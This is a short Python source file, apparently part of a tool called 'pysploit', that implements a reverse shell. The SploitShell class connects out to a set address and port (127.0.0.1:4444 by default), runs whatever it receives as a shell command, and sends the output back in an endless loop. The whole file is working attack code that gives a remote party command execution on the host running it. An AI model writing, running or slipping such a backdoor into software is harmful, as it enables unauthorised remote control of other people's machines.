import socket, os, subprocess

"""
Custom shell wrapper for pysploit
"""
class SploitShell:
	def __init__(self, address, port):
		self.address = address
		self.port = port
		self.conn_socket = None

	def connect(self):
		print ("[*] Trying to connect to {}:{}".format(self.address, self.port))
		self.conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.conn_socket.connect((self.address, self.port))
		print ("[+] Connection established")

	def send(self, data):
		print ("sending: {}".format(data))
		self.conn_socket.send(data)

	def receive(self):
		print ("Receiving")
		received_data = self.conn_socket.recv(1024)
		print (received_data)
		shell_process = subprocess.Popen(received_data, shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
			stdin=subprocess.PIPE)
		stdout_val = shell_process.stdout.read() + shell_process.stderr.read()
		args = stdout_val
		self.send(args)

	def run(self):
		self.connect()

		while True:
			self.receive()


if __name__ == "__main__":
	ss = SploitShell('127.0.0.1', 4444)
	ss.run()